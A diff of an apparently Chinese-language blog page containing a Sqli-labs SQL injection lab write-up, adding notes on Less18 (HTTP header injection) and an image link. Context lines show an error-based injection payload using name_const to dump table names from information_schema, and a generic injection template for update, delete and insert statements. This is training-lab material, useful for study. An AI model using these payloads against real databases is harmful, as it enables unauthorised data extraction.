@@ -35,7 +35,8 @@
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/19.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/20.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/21.png">
-<meta property="og:updated_time" content="2019-04-27T14:26:23.648Z">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/01/01/Sqli-labs-writeup/22.png">
+<meta property="og:updated_time" content="2019-05-14T15:17:46.844Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-labs Less1-20">
 <meta name="twitter:description" content="0x01 Less1-Less10参考旧博客文章《Sqli-labs之Less1-10》，个人觉得写得还算详细。 下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFIL">
@@ -102,7 +103,7 @@
         <li><a class="icon" href="/2019/01/28/IA-32寄存器/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" href="/2019/01/01/Linux环境与相关工具/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" href="/2019/01/01/PHP反序列化漏洞/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -341,7 +342,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666&apos; and (SELECT * FROM (SELECT name_const((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;security&apos;),1),name_const((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;security&apos;),1)) a)#</span><br></pre></td></tr></table></figure>
 <p>总的来说，对于update、delete和insert都有一个固定的结构：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... or (select * from (select name_const((select ...),1),name_const((select ...),1)) a) ...</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-Less18"><a href="#0x09-Less18" class="headerlink" title="0x09 Less18"></a>0x09 Less18</h2>
+<h2 id="0x09-Less18"><a href="#0x09-Less18" class="headerlink" title="0x09 Less18"></a>0x09 Less18</h2><p>访问页面，有个登录框和显示ip地址一栏信息：</p>
+<p><img src="/2019/01/01/Sqli-labs-writeup/22.png" alt=""></p>
+<p>尝试一番操作，在username和password都没有疑似SQL注入的问题。</p>
+<p>其实本页面的标题已经提示我们是HTTP头注入了。</p>
+
   </div>
 </article>
 
